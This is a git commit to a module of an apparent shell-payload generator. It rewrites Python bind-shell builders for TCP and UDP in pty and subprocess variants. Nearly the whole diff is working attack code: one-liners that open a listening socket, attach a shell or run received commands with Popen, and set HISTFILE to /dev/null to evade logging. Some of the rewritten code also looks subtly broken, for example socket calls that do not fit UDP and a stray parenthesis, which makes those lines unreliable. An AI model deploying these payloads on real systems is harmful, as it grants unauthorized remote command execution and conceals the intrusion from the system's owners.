9d77bfa89e66c1912caea874441777ef6e6c5de6
Nong Hoang Tu <dmknght@parrotsec.org>
2021-02-18 16:48:22 +0700

    First optimize for python module

--- shellgen/modules/multi/python.py
+++ shellgen/modules/multi/python.py
@@ -1,4 +1,5 @@
 from ogabog.cores import plugin, const
+from ogabog.cores.argutils import is_write_file
 
 
 class ReverseTCP(plugin.ReverseShell):
@@ -107,16 +108,28 @@ class BindTCP(plugin.BindShell):
             help="Select shell type on target machine"
         )
         self.extension = "py"
-        self.set_write_file()
         self.opts.description = "[BindShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description = "\n[BindShell][TCP] Python from infodox/python-pty-shells. License WTFPL."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
+        self.set_write_file()
 
     def make_shell(self):
         if self.args.exec == "pty":
-            self.shell = f"""{self.args.type} -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.args.port}));s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("{self.args.shell}");s.close()'"""
+            self.shell = "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            self.shell += f"s.bind((\"0.0.0.0\",{self.args.port}));"
+            self.shell += "s.listen(1);(rem,addr)=s.recvfrom(1024);os.dup2(rem.fileno(),0);"
+            self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);"
+            self.shell += f"os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"{self.args.shell}\");s.close()"
         else:
-            self.shell = f'''{self.args.type} -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{self.args.port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\''''
+            self.shell = "exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);"
+            self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));"
+            self.shell += "s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();"
+            self.shell += "p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
+            self.shell += "c.sendall(p.stdout.read()+p.stderr.read())\"\"\")"
+        if is_write_file():
+            self.shell = self.shell.replace(";", "\n")
+        else:
+            self.shell = f"{self.args.type} -c '" + self.shell + "\'"
 
 
 class BindUDP(BindTCP):
@@ -126,6 +139,18 @@ class BindUDP(BindTCP):
         self.opts.description = "[BindShell][UDP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
 
     def make_shell(self):
-        pass # TODO make Bind shell python UDP with pty & subprocess
-        bindshell_udp_pty = """python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.bind(("0.0.0.0",8080));s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'"""
-        bindshell_udp_subprocess = '''python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_DGRAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",8080));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\''''
+        if self.args.exec == "pty":
+            self.shell = "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
+            self.shell += f"s.bind((\"0.0.0.0\",{self.args.port}));(rem,addr)=s.recvfrom(1024);os.dup2(rem.fileno(),0);"
+            self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");"
+            self.shell += f"pty.spawn(\"{self.args.shell}\");s.close()"
+        else:
+            self.shell = "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_DGRAM);"
+            self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));s1.listen(1);"
+            self.shell += "c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();"
+            self.shell += "p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
+            self.shell += "c.sendall(p.stdout.read()+p.stderr.read()))"
+        if is_write_file():
+            self.shell = self.shell.replace(";", "\n")
+        else:
+            self.shell = f"{self.args.type} -c '" + self.shell + "\'"
